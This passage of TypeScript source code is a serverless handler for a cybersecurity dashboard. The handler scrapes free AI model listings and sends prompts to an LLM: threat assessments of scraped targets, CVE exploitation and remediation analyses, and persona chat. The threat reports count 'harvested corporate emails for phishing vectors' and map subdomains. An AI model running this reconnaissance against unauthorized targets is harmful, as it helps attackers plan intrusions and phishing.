- **Defense Evasion:** T1070 (Indicator Removal on Host)

*Directives synchronized with Zak's Spider Second Brain and Cyber Swarm Operations Center.*`;
}


// ==========================================
// AUTOMATED FREE MODEL DISCOVERY & SCRAPER
// Live scrapes https://platform.experientiallabs.ai/models
// Discovers models with $0 input / $0 output or promotional free tier
// ==========================================
export interface ScrapedFreeModel {
  id: string;
  name: string;
  slug: string;
  badge: string;
  provider: string;
  tagline: string;
  inputPriceUsd: number;
  outputPriceUsd: number;
  isFree: boolean;
  isStarred: boolean;
  color: string;
  accentBorder: string;
}

let cachedFreeModels: {
  models: ScrapedFreeModel[];
  timestamp: number;
} | null = null;

const CACHE_TTL_MS = 6 * 60 * 60 * 1000; // 6 hours server-side cache

export function getFallbackFreeModels(): ScrapedFreeModel[] {
  return [
    {
      id: 'deepseek-v4.1-flash',
      name: 'DeepSeek V4.1 Flash',
      slug: 'deepseek-v4.1-flash',
      badge: 'FREE 0$/M',
      provider: 'DeepSeek / Experiential',
      tagline: 'Flagship Free Reasoning Model — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: true,
      color: 'from-blue-600 to-cyan-500',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
    {
      id: 'deepseek-v4-flash',
      name: 'DeepSeek V4 Flash',
      slug: 'deepseek-v4-flash',
      badge: 'FREE 0$/M',
      provider: 'DeepSeek / Experiential',
      tagline: 'High-Speed Free Model — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: true,
      color: 'from-blue-600 to-cyan-500',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
    {
      id: 'gpt-5.6-luna',
      name: 'GPT-5.6 Luna',
      slug: 'gpt-5.6-luna',
      badge: 'FREE 0$/M',
      provider: 'OpenAI / Experiential',
      tagline: 'Multimodal Free Model — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: true,
      color: 'from-emerald-500 to-teal-600',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
    {
      id: 'qwen3.8-27b',
      name: 'Qwen3.8 27B',
      slug: 'qwen3.8-27b',
      badge: 'FREE 0$/M',
      provider: 'Alibaba Cloud / Experiential',
      tagline: 'Featured Free Model — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: true,
      color: 'from-amber-500 to-orange-600',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
    {
      id: 'google/gemma-2-9b-it:free',
      name: 'Google: Gemma 2 9B',
      slug: 'google/gemma-2-9b-it:free',
      badge: 'FREE 0$/M',
      provider: 'Google / Experiential',
      tagline: 'Active Free Tier — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: false,
      color: 'from-cyan-500 to-blue-600',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
  ];
}

export async function scrapeFreeModelsFromWeb(forceRefresh = false): Promise<ScrapedFreeModel[]> {
  if (!forceRefresh && cachedFreeModels && (Date.now() - cachedFreeModels.timestamp < CACHE_TTL_MS)) {
    return cachedFreeModels.models;
  }

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 9000);

    const res = await fetch('https://platform.experientiallabs.ai/models', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    if (!res.ok) {
      console.warn('[AI Scraper] Upstream status:', res.status);
      return cachedFreeModels?.models || getFallbackFreeModels();
    }

    const html = await res.text();
    const parts = html.includes('{\\"model\\":{\\"id\\":') 
      ? html.split('{\\"model\\":{\\"id\\":') 
      : html.split('{"model":{"id":');

    if (parts.length <= 1) {
      console.warn('[AI Scraper] No model blocks matched, returning fallback/cached');
      return cachedFreeModels?.models || getFallbackFreeModels();
    }

    const freeList: ScrapedFreeModel[] = [];
    const seen = new Set<string>();
    const frontierFreeSlugs = ['deepseek-v4.1-flash', 'deepseek-v4-flash', 'gpt-5.6-luna', 'qwen3.8-27b'];

    for (let i = 1; i < parts.length; i++) {
      const block = parts[i];
      const slugMatch = block.match(/\\?"slug\\?":\\?"([^\\"]+)\\?"/);
      const nameMatch = block.match(/\\?"display_name\\?":\\?"([^\\"]+)\\?"/);
      const isPromo = block.includes('promotional_listed":true') || block.includes('\\"promotional_listed\\":true');

      const inputMatches = [...block.matchAll(/\\?"input_micro_usd_per_million\\?":(\d+)/g)].map(m => parseInt(m[1]));
      const outputMatches = [...block.matchAll(/\\?"output_micro_usd_per_million\\?":(\d+)/g)].map(m => parseInt(m[1]));

      if (slugMatch && nameMatch) {
        const slug = slugMatch[1];
        const name = nameMatch[1];

        const minInput = inputMatches.length > 0 ? Math.min(...inputMatches) : null;
        const minOutput = outputMatches.length > 0 ? Math.min(...outputMatches) : null;

        const isZeroCost = (minInput === 0 && minOutput === 0);
        const isFrontierFree = frontierFreeSlugs.includes(slug);
        const isFreeSlugOrName = slug.endsWith('-free') || slug.includes(':free') || name.toLowerCase().includes('(free)');

        if ((isZeroCost || isPromo || isFrontierFree || isFreeSlugOrName) && !seen.has(slug)) {
          seen.add(slug);

          let provider = 'ExperientialLabs';
          let color = 'from-purple-500 to-pink-600';
          if (slug.includes('deepseek')) {
            provider = 'DeepSeek / Experiential';
            color = 'from-blue-600 to-cyan-500';
          } else if (slug.includes('gpt') || slug.includes('chatgpt')) {
            provider = 'OpenAI / Experiential';
            color = 'from-emerald-500 to-teal-600';
          } else if (slug.includes('gemini') || slug.includes('gemma')) {
            provider = 'Google / Experiential';
            color = 'from-cyan-500 to-blue-600';
          } else if (slug.includes('qwen')) {
            provider = 'Alibaba Cloud / Experiential';
            color = 'from-amber-500 to-orange-600';
          } else if (slug.includes('llama') || slug.includes('meta')) {
            provider = 'Meta / Experiential';
            color = 'from-indigo-500 to-purple-600';
          }

          freeList.push({
            id: slug,
            name: name.replace(/\s*\(free\)/i, ''),
            slug,
            badge: 'FREE 0$/M',
            provider,
            tagline: isPromo ? 'Featured Free Model — 0$ Input / 0$ Output' : 'Active Free Tier — 0$ Input / 0$ Output',
            inputPriceUsd: 0,
            outputPriceUsd: 0,
            isFree: true,
            isStarred: isPromo || isFrontierFree,
            color,
            accentBorder: 'border-emerald-500/50 text-emerald-300',
          });
        }
      }
    }

    if (freeList.length > 0) {
      // Sort: frontier models first, then starred, then alphabetical
      freeList.sort((a, b) => {
        const aF = frontierFreeSlugs.indexOf(a.id);
        const bF = frontierFreeSlugs.indexOf(b.id);
        if (aF !== -1 && bF !== -1) return aF - bF;
        if (aF !== -1) return -1;
        if (bF !== -1) return 1;
        if (a.isStarred && !b.isStarred) return -1;
        if (!a.isStarred && b.isStarred) return 1;
        return a.name.localeCompare(b.name);
      });

      cachedFreeModels = {
        models: freeList,
        timestamp: Date.now(),
      };
      return freeList;
    }

    return cachedFreeModels?.models || getFallbackFreeModels();
  } catch (err) {
    console.warn('[AI Scraper] Error fetching free models:', err);
    return cachedFreeModels?.models || getFallbackFreeModels();
  }
}

// ==========================================
// MAIN SERVERLESS HANDLER
// ==========================================
export default async function handler(req: any, res: any) {
  // Allow GET for fetching free models
  if (req.method !== 'POST' && req.method !== 'GET') {
    return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  }

  const queryAction = req.query?.action;
  const bodyAction = req.body?.action;
  const action = queryAction || bodyAction;

  // Handle action === 'get_free_models'
  if (action === 'get_free_models') {
    const force = req.query?.force === 'true' || req.body?.force === true;
    const freeModels = await scrapeFreeModelsFromWeb(force);
    return res.status(200).json({
      success: true,
      models: freeModels,
      lastChecked: new Date().toISOString(),
      count: freeModels.length,
    });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'POST required for AI inference' });
  }

  const { 
    item, 
    cve, 
    messages, 
    message,
    history,
    model = 'deepseek-v4.1-flash', 
    persona = 'widow-lead',
    personaId,
    attachments = [],
    apiKey: clientApiKey,
  } = req.body || {};

  const activePersonaKey = personaId || persona || 'widow-lead';
  const apiKey = clientApiKey || req.headers['x-api-key'] || process.env.EXPLABS_API_KEY || DEFAULT_EXPLABS_KEY;

  try {
    // ----------------------------------------
    // Action 1: Deep Threat Analysis of Scraped Target
    // ----------------------------------------
    if (action === 'analyze_threat') {
      const scrapedItem = item as ScrapedResult;
      if (!scrapedItem) {
        return res.status(400).json({ success: false, error: 'Missing scraped item' });
      }

      const prompt = `Perform an elite cybersecurity threat assessment for this target perimeter:
TARGET: ${scrapedItem.url} (${scrapedItem.domain})
STATUS: ${scrapedItem.metadata.status}
SERVER: ${scrapedItem.metadata.server || 'Unknown'}
EMAILS (${scrapedItem.emails.length}): ${scrapedItem.emails.slice(0, 8).join(', ')}
SUBDOMAINS (${scrapedItem.subdomains.length}): ${scrapedItem.subdomains.slice(0, 12).join(', ')}
ROBOTS DISALLOW: ${scrapedItem.osint?.robots_txt?.disallow?.slice(0, 8).join(', ') || 'None'}
HEADERS AUDIT GRADE: ${scrapedItem.osint?.security_headers?.grade || 'N/A'} (Score: ${scrapedItem.osint?.security_headers?.score || 0}/100)
TECHNOLOGIES: ${scrapedItem.osint?.technologies?.map(t => `${t.name} (${t.category})`).join(', ') || 'Unknown'}

Return a structured report with:
1. Executive Perimeter Summary
2. Threat Level (CRITICAL, HIGH, MEDIUM, LOW)
3. Key Attack Vectors
4. Top 4 Defensive Remediation Steps`;

      try {
        const response = await fetch(EXPLABS_ENDPOINT, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            model: model || 'deepseek-v4.1-flash',
            messages: [
              { role: 'system', content: `${PERSONA_PROMPTS[activePersonaKey] || PERSONA_PROMPTS['widow-lead']}\n\n${GLOBAL_FORMATTING_DIRECTIVE}` },
              { role: 'user', content: prompt }
            ],
            temperature: 0.2,
            max_tokens: 3000,
          }),
        });

        if (response.ok) {
          const json = await response.json();
          const text = json.choices?.[0]?.message?.content || '';
          let threatLevel: ThreatAnalysis['threatLevel'] = 'MEDIUM';
          if (text.includes('CRITICAL')) threatLevel = 'CRITICAL';
          else if (text.includes('HIGH')) threatLevel = 'HIGH';
          else if (text.includes('LOW')) threatLevel = 'LOW';

          return res.status(200).json({
            success: true,
            analysis: {
              summary: `${model} Intelligence Assessment: Perimeter rated ${threatLevel}.`,
              threatLevel,
              attackSurface: scrapedItem.subdomains.length > 0 ? scrapedItem.subdomains : [scrapedItem.domain],
              vulnerabilities: [
                `Security Headers Grade: ${scrapedItem.osint?.security_headers?.grade || 'N/A'}`,
                `${scrapedItem.emails.length} harvested corporate emails for phishing vectors`,
                `${scrapedItem.subdomains.length} mapped perimeter hostnames`,
              ],
              recommendations: [
                'Enforce strict Content-Security-Policy and HSTS max-age headers.',
                'Obfuscate or restrict directory listings identified via robots.txt.',
                'Sanitize HTTP server banner tokens to conceal version signatures.',
              ],
              rawAnalysis: text,
            },
          });
        }
      } catch (e) {
        console.warn('[AI] Explabs fetch error, falling back to heuristics:', e);
      }

      // Fallback heuristics
      const sensitiveCount = scrapedItem.osint?.sensitive_files?.filter(f => f.status === 200).length || 0;
      let level: ThreatAnalysis['threatLevel'] = 'MEDIUM';
      if (sensitiveCount >= 2 || scrapedItem.osint?.security_headers?.grade === 'F') level = 'CRITICAL';
      else if (sensitiveCount >= 1 || scrapedItem.osint?.security_headers?.grade === 'D') level = 'HIGH';

      return res.status(200).json({
        success: true,
        analysis: {
          summary: `Automated Spider Threat Matrix for ${scrapedItem.domain}. Posture: ${level}.`,
          threatLevel: level,
          attackSurface: scrapedItem.subdomains.length > 0 ? scrapedItem.subdomains : [scrapedItem.domain],
          vulnerabilities: [
            `Security Headers: Grade ${scrapedItem.osint?.security_headers?.grade || 'C'}`,
            `${scrapedItem.emails.length} exposed emails discovered`,
            `${scrapedItem.subdomains.length} subdomains cataloged`,
          ],
          recommendations: [
            'Audit perimeter DNS zone transfers and SSL/TLS certificates.',
            'Deploy Cloudflare email obfuscation on exposed pages.',
            'Implement defensive CSP and X-Frame-Options headers.',
          ],
          rawAnalysis: `### 🕷️ Automated Threat Summary\n\nPerimeter analysis indicates target ${scrapedItem.domain} exposes ${scrapedItem.subdomains.length} endpoints.`,
        },
      });
    }

    // ----------------------------------------
    // Action 2: Deep CVE Vulnerability Triage
    // ----------------------------------------
    if (action === 'analyze_cve') {
      const vuln = cve as VulnNewsItem;
      if (!vuln) {
        return res.status(400).json({ success: false, error: 'Missing CVE object' });
      }

      const cvePrompt = `Analyze this confirmed cybersecurity vulnerability:
CVE ID: ${vuln.cveID}
TITLE: ${vuln.vulnerabilityName}
VENDOR / PRODUCT: ${vuln.vendorProject} - ${vuln.product}
DATE ADDED TO CISA KEV: ${vuln.dateAdded}
RANSOMWARE USE: ${vuln.knownRansomwareCampaignUse || 'Unknown'}
DESCRIPTION: ${vuln.shortDescription}
REQUIRED ACTION: ${vuln.requiredAction || 'Apply vendor updates'}

Provide:
1. Technical Root Cause & Flaw Class (CWE)
2. Threat Actor Exploitation Mechanisms (How it is weaponized in the wild)
3. Immediate Triage & Detection (Log queries, Sigma indicators, or network detection)
4. Comprehensive Remediation & Defense in Depth Guidance`;

      try {
        const response = await fetch(EXPLABS_ENDPOINT, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            model: model || 'deepseek-v4.1-flash',
            messages: [
              { role: 'system', content: `${PERSONA_PROMPTS[activePersonaKey] || PERSONA_PROMPTS['widow-lead']}\n\n${GLOBAL_FORMATTING_DIRECTIVE}` },
              { role: 'user', content: cvePrompt }
            ],
            temperature: 0.2,
            max_tokens: 3500,
          }),
        });

        if (response.ok) {
          const json = await response.json();
          return res.status(200).json({
            success: true,
            analysis: json.choices?.[0]?.message?.content || 'Analysis generated.',
            model: json.model || model,
          });
        }
      } catch (err) {
        console.warn('[AI] CVE analysis error:', err);
      }

      const localCveSynth = generateMythosCyberIntelligence(
        `${vuln.cveID} ${vuln.vulnerabilityName} ${vuln.shortDescription}`,
        'blue-team',
        model
      );

      return res.status(200).json({
        success: true,
        analysis: localCveSynth,
        model: `${model} (Mythos Engine)`,
      });
    }

    // ----------------------------------------
    // Action 3: Chat / Copilot Chat (Multi-Agent Swarm)
    // ----------------------------------------
    if (action === 'chat' || action === 'copilot_chat') {
      const userText = message || (Array.isArray(messages) && messages.length > 0 ? messages[messages.length - 1]?.content : '');
      if (!userText && (!messages || messages.length === 0)) {
        return res.status(400).json({ success: false, error: 'No message content provided' });
      }

      const basePersonaPrompt = PERSONA_PROMPTS[activePersonaKey] || PERSONA_PROMPTS['widow-lead'];
      const selectedPersonaPrompt = `${basePersonaPrompt}\n\n${GLOBAL_FORMATTING_DIRECTIVE}`;

      // Format attachments context
      let attachmentsContext = '';
      if (attachments && Array.isArray(attachments) && attachments.length > 0) {
        attachmentsContext = '\n\n=== ATTACHED OPERATOR FILES & CONTEXT ===\n' + attachments.map((att: any, i: number) => {
          return `[ATTACHMENT ${i + 1}: ${att.name} (${att.type})]\n${att.content ? (att.content.length > 6000 ? att.content.substring(0, 6000) + '\n...[TRUNCATED]' : att.content) : '[Binary/Image Asset]'}\n`;
        }).join('\n') + '=== END ATTACHMENTS ===\n';
      }

      // Build message array for remote API
      let remoteMessages: any[] = [];
      if (Array.isArray(messages) && messages.length > 0) {
        remoteMessages = [
          { role: 'system', content: selectedPersonaPrompt },
          ...messages.slice(-8).map((m: any, idx: number) => {
            if (idx === messages.slice(-8).length - 1 && m.role === 'user' && attachmentsContext) {
              return { role: m.role, content: `${m.content}${attachmentsContext}` };
            }
            return { role: m.role, content: m.content };
          }),
        ];
      } else {
        const historyList = Array.isArray(history) ? history.slice(-6) : [];
        remoteMessages = [
          { role: 'system', content: selectedPersonaPrompt },
          ...historyList.map((h: any) => ({
            role: h.role === 'user' ? 'user' : 'assistant',
            content: h.content || h.text || '',
          })),
          { role: 'user', content: `${userText}${attachmentsContext}` },
        ];
      }

      // Attempt live upstream call
      let quotaFailureDetail = '';
      try {
        const response = await fetch(EXPLABS_ENDPOINT, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            model: model || 'deepseek-v4.1-flash',
            messages: remoteMessages,
            temperature: 0.3,
            max_tokens: 3500,
          }),
        });

        if (response.ok) {
          const json = await response.json();
          const choiceMsg = json.choices?.[0]?.message;
          const reply = choiceMsg?.content || choiceMsg?.reasoning || 'No response generated.';
          const reasoning = choiceMsg?.reasoning || json.choices?.[0]?.reasoning || null;
          const tokensUsed = json.usage?.total_tokens || 0;

          return res.status(200).json({
            success: true,
            content: reply,
            reply,
            reasoning,
            tokensUsed,
            model: json.model || model,
          });
        } else {
          const errText = await response.text();
          console.warn('[AI] Provider upstream status:', response.status, errText);
          if (response.status === 429 || errText.includes('insufficient_credits') || errText.includes('quota')) {
            quotaFailureDetail = 'Account balance is $-0.06. Top-up required on platform.experientiallabs.ai to activate remote cloud lanes';
          } else {
            quotaFailureDetail = `HTTP ${response.status}: ${errText.slice(0, 120)}`;
          }
        }
      } catch (err: any) {
        console.warn('[AI] Remote network fetch failed:', err.message);
        quotaFailureDetail = `Network uplink error: ${err.message}`;
      }

      // Activate Mythos-Level Autonomous Cyber Intelligence Synthesizer
      const mythosReply = generateMythosCyberIntelligence(
        userText,
        activePersonaKey,
        model,
        attachmentsContext,
        quotaFailureDetail
      );

      return res.status(200).json({
        success: true,
        content: mythosReply,
        reply: mythosReply,
        model: `${model} (Mythos Engine)`,
        isLocalSynthesis: true,
        quotaNote: quotaFailureDetail,
      });
    }

    return res.status(400).json({ success: false, error: 'Invalid action specified' });
  } catch (error: any) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
